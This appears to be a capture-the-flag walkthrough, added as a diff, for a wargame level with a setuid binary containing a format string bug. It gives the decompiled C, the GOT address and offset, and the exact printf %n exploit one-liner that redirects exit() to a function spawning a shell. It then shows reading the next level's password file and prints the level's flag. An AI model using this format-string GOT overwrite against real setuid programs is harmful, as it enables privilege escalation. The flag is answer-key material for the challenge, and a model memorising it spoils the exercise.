@@ -1,0 +1,53 @@
+# Level5 Walkthrough
+
+Binary is setuid `level6`. `main` calls `n`:
+
+```c
+void o(void) {
+  system("/bin/sh");
+  _exit(1);
+}
+
+void n(void) {
+  char buffer[520];
+
+  fgets(buffer, 512, stdin);
+  printf(buffer);
+  exit(1);
+}
+```
+
+## Vulnerability
+
+Same format string bug: `printf(buffer)`. There is no global to set this time.
+Instead `o()` runs `system("/bin/sh")` but is never called, and `n()` calls
+`exit(1)` right after `printf`.
+
+Idea: overwrite the GOT entry of `exit` with the address of `o`, so that the
+`exit(1)` call jumps into `o()` instead.
+
+## Exploitation
+
+- Address of `o`: `0x080484a4` (= 134513828) -> the value to write.
+- GOT entry of `exit`: `objdump -R level5 | grep exit` -> `0x08049838` -> where to write.
+- Offset: `python -c 'print "AAAA" + ".%x"*10' | ./level5` shows `41414141` at the 4th position.
+
+Write `0x080484a4` into the `exit` GOT entry with `%n`. Field width =
+`134513828 - 4 = 134513824`.
+
+```sh
+(python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"'; cat) | ./level5
+```
+
+`exit(1)` now jumps to `o()` -> `system("/bin/sh")`.
+
+```sh
+whoami            # level6
+cat /home/user/level6/.pass
+```
+
+Flag:
+
+```txt
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
